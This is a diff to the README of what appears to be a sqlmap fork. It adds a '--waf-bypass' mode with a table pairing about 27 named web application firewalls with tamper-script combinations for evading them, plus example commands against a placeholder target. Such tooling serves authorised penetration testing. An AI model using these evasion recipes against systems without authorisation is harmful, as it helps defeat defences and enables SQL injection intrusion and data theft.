@@ -45,19 +45,46 @@ This fork includes advanced WAF bypass techniques based on recent security resea
 
 ### New `--waf-bypass` Option
 
-Smart WAF detection with optimized tamper selection (max 3-4 tampers):
+Smart WAF detection with optimized tamper selection (max 4 tampers per WAF):
 
     python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=auto
     python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=cloudflare
 
-| Mode | Description |
-|------|-------------|
-| `auto` | Auto-detect WAF and apply optimal tampers |
-| `cloudflare` | 8KB body limit bypass + obfuscation |
-| `aws` | AWS WAF specific bypass |
-| `modsecurity` | Comment-based + version keywords |
-| `imperva` | Unicode + header manipulation |
-| `akamai` | Oversized + header spoofing |
+**Modes:**
+- `auto` - Waits for WAF detection, then applies specific tampers dynamically
+- `<waf_name>` - Applies tampers for that WAF immediately
+
+**Supported WAFs (30+):**
+
+| Category | WAF | Tampers |
+|----------|-----|---------|
+| **Cloud** | `cloudflare` | space2comment, between, randomcase, charencode |
+| | `aws` | space2comment, between, randomcase, charencode |
+| | `akamai` | charunicodeencode, space2comment, randomcase, space2plus |
+| | `azure` | charunicodeencode, space2comment, randomcase |
+| | `google` | space2comment, between, randomcase, charencode |
+| | `sucuri` | space2comment, between, randomcase, charencode |
+| | `stackpath` | space2plus, space2comment, randomcase |
+| **Commercial** | `modsecurity` | between, randomcase, space2comment, modsecurityversioned |
+| | `imperva` | space2comment, space2morehash, between, percentage |
+| | `f5` / `bigip` | between, randomcase, space2comment, equaltolike |
+| | `fortinet` | space2comment, randomcase, overlongutf8 |
+| | `barracuda` | space2comment, between, percentage, randomcase |
+| | `citrix` | space2comment, between, randomcase, equaltolike |
+| | `radware` | charencode, randomcase, space2comment, charunicodeencode |
+| | `paloalto` | space2comment, randomcase, charencode |
+| | `bluecoat` | space2comment, between, randomcase, bluecoat |
+| **CMS/PHP** | `wordfence` | space2comment, randomcase, unmagicquotes |
+| | `litespeed` | space2comment, randomcase, unmagicquotes |
+| | `comodo` | modsecurityversioned, space2comment, between |
+| **Other** | `wallarm` | charunicodeencode, space2comment, randomcase |
+| | `naxsi` | space2comment, randomcase, charencode |
+| | `webknight` | space2comment, randomcase, charencode |
+| | `dotdefender` | space2comment, randomcase, charencode |
+| **Chinese** | `360` | charencode, randomcase, space2comment |
+| | `aliyundun` | charencode, randomcase, charunicodeencode |
+| | `baidu` | charencode, randomcase, space2comment |
+| | `safedog` | charencode, randomcase, space2comment |
 
 ### New Tamper Scripts
 
@@ -99,8 +126,16 @@ python sqlmap.py -u "http://target.com/?id=1" --tamper=junkchars,linebreaks
 # Token breaker for WAF tokenizers
 python sqlmap.py -u "http://target.com/?id=1" --tamper=tokenbreaker
 
-# Combined techniques
-python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=3 --chunked
+# Auto-detect WAF and apply specific tampers dynamically
+python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=auto
+
+# Force specific WAF bypass (applies tampers immediately)
+python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=cloudflare
+python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=modsecurity
+python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=f5
+
+# Combined with chunked encoding
+python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=auto --chunked
 ```
 
 See [CHANGELOG_WAF_BYPASS.md](CHANGELOG_WAF_BYPASS.md) for full details.
